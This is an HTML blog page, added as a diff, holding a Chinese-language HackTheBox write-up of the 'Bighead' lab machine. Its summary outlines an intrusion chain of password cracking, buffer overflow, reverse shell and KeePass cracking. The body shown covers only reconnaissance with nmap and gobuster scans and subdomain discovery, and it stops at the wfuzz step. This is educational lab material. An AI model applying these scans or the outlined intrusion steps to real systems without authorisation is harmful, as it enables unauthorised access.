@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Bighead - T0x1c</title>
+
+  
+    <meta name="description" content="Bighead是一个非常困难的靶机，知识点涉及zip密码爆破、子域名探测、密码爆破、git信息泄漏、缓冲区溢出、反弹shell、隧道建立、BvShell逃逸、KeePass密码破解等。在子域名中发现响应服务器为BigheadWebsvr，通过谷歌搜索发现github中存在该服务器的源码，直接下载其zip压缩并通过密码破解出密码，通过该密码解压文件后存在git信息泄漏，在版本二中存在exe与dll文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Bighead">
+<meta property="og:url" content="https://toxic80l.github.io/post/c31ee5f/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Bighead是一个非常困难的靶机，知识点涉及zip密码爆破、子域名探测、密码爆破、git信息泄漏、缓冲区溢出、反弹shell、隧道建立、BvShell逃逸、KeePass密码破解等。在子域名中发现响应服务器为BigheadWebsvr，通过谷歌搜索发现github中存在该服务器的源码，直接下载其zip压缩并通过密码破解出密码，通过该密码解压文件后存在git信息泄漏，在版本二中存在exe与dll文">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0310.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8B%E5%8D%881.52.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8B%E5%8D%882.00.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8B%E5%8D%884.56.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8B%E5%8D%885.28.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%883.40.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%883.41.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%883.43.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%884.00.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%888.13.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%884.24.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%884.25.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%884.26.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%889.50.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%889.51.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%889.54.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%889.56.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.06.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.09.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.12.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.09.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.18.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.21.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.24.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.27.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.48.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8810.58.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.01.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.04.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.08.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.15.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%8811.16.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-23%20%E4%B8%8A%E5%8D%889.04.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-23%20%E4%B8%8A%E5%8D%889.05.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8810.24.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8810.52.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.29.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.31.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.32.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.34.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8A%E5%8D%8811.35.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8B%E5%8D%883.37.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-24%20%E4%B8%8B%E5%8D%883.37.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-25%20%E4%B8%8A%E5%8D%889.09.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-25%20%E4%B8%8A%E5%8D%889.23.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-25%20%E4%B8%8A%E5%8D%889.26.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%888.48.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%889.07.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%889.16.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%889.20.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8A%E5%8D%889.37.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8B%E5%8D%8812.13.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8B%E5%8D%8812.16.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-26%20%E4%B8%8B%E5%8D%882.03.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%885.55.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%885.56.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.12.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.14.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.16.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.18.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-27%20%E4%B8%8B%E5%8D%886.46.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.20.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.36.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.55.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.58.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%884.59.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.01.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.02.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.19.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.20.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.22.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.23.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.25.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.30.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.31.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.39.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.45.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%885.52.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%886.02.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%886.03.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%886.04.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-29%20%E4%B8%8A%E5%8D%886.06.17.png">
+<meta property="article:published_time" content="2022-02-24T01:56:47.000Z">
+<meta property="article:modified_time" content="2022-02-24T09:39:59.644Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="密码爆破">
+<meta property="article:tag" content="KeePass">
+<meta property="article:tag" content="zip">
+<meta property="article:tag" content="子域名">
+<meta property="article:tag" content="BvShell">
+<meta property="article:tag" content="git信息泄漏">
+<meta property="article:tag" content="缓冲区溢出">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0310.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A2%E6%B5%8B"><span class="toc-text">子域名探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-nelson"><span class="toc-text">0x02 上线[nelson]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">zip密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-text">git信息泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-text">缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%A8%A1%E6%8B%9F%E6%B5%8B%E8%AF%95"><span class="toc-text">本地模拟测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%BA%A2%E5%87%BA%E8%84%9A%E6%9C%AC"><span class="toc-text">编写溢出脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-nginx"><span class="toc-text">0x03 权限提升[nginx]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BF%9B%E7%A8%8B"><span class="toc-text">端口进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-text">注册表</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E9%9A%A7%E9%81%93"><span class="toc-text">建立隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#plink"><span class="toc-text">plink</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chisel"><span class="toc-text">chisel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf"><span class="toc-text">msf</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%99%BB%E9%99%86"><span class="toc-text">ssh登陆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-system"><span class="toc-text">0x04 权限提升[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BvShell%E9%80%83%E9%80%B8"><span class="toc-text">BvShell逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEflag"><span class="toc-text">寻找flag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#KeePass%E8%AF%86%E5%88%AB"><span class="toc-text">KeePass识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-text">破解密码</span></a></li></ol></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-02-24T01:56:47.000Z">2022-02-24</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Bighead</span></h1>
+<p>Bighead是一个非常困难的靶机，知识点涉及zip密码爆破、子域名探测、密码爆破、git信息泄漏、缓冲区溢出、反弹shell、隧道建立、BvShell逃逸、KeePass密码破解等。在子域名中发现响应服务器为BigheadWebsvr，通过谷歌搜索发现github中存在该服务器的源码，直接下载其zip压缩并通过密码破解出密码，通过该密码解压文件后存在git信息泄漏，在版本二中存在exe与dll文件，对其进行测试并发现其存在缓冲区溢出漏洞，编写脚本上线来获取用户权限，在靶机上搭建隧道并使用注册表中破解的密码登陆ssh，登陆成功后发现运行环境为BvShell，借助code子域名中的php文件执行反弹shell，成功获取系统权限，最终以破解KeePass数据库密码，配置密钥登陆其中拿到flag。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0310.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8B%E5%8D%881.52.41.png" alt="截屏2021-11-21 下午1.52.41"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.112 -oA nmap_BigHead</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8B%E5%8D%882.00.14.png" alt="截屏2021-11-21 下午2.00.14"><br>扫描结果显示目标只开放了80端口</p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问站点，是一个博客网站<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8B%E5%8D%884.56.04.png" alt="截屏2021-11-21 下午4.56.04"></p>
+<p>对该站点进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.112 -w /usr/share/wordlists/dirb/big.txt -x php</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8B%E5%8D%885.28.32.png" alt="截屏2021-11-21 下午5.28.32"><br>扫描目录过程中发现重定向，在 hosts 文件中修改域名解析</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.112</span> <span class="string">bighead.htb</span></span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.112</span> <span class="string">code.bighead.htb</span></span><br></pre></td></tr></table></figure>
+<p>访问其中的 phpinfo.php 文件，发现该系统为 Windows Server 2008<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%883.40.06.png" alt="截屏2021-11-22 上午3.40.06"><br>而访问<code>/backend</code>目录显示报错界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%883.41.22.png" alt="截屏2021-11-22 上午3.41.22"></p>
+<h3 id="子域名探测"><a href="#子域名探测" class="headerlink" title="子域名探测"></a>子域名探测</h3><p>在站点界面中点击发送可发现第二个子域名<code>mailer.bighead.htb</code>，与此同时将其添加到 hosts 文件当中<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/c31ee5f/%E6%88%AA%E5%B1%8F2021-11-22%20%E4%B8%8A%E5%8D%883.43.37.png" alt="截屏2021-11-22 上午3.43.37"><br>为了探测更多的子域名，我们可以使用 wfuzz 对其子域名进行枚举</p>
